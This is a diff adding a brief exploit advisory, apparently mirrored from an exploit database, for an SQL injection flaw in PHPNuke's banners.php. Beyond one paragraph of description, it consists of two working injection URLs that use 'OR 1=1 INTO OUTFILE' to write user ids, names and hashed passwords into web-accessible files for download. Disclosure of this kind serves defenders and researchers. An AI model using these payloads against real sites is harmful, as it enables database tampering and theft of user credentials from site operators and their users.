@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/7170/info
+
+It has been reported that an input validation error exists in the banners.php file included with PHPNuke. Because of this, an attacker could send a malicious string through PHPNuke that would allow the attacker to manipulate the database, and potentially access sensitive information, then download it via the web.
+
+This will save id, name and crypted password into
+http://www.example.com/banners1.txt :
+http://www.example.com/banners.php?op=Ok&login='%20OR%201=1%20INTO%20OUTFILE%20'[path/to/site]/banners1.txt
+
+This will save crypted password into http://[target]/banners2.txt :
+http://www.example.com/banners.php?op=Change&cid='%20OR%201=1%20INTO%20OUTFILE%20'[path/to/site]/banners2.txt
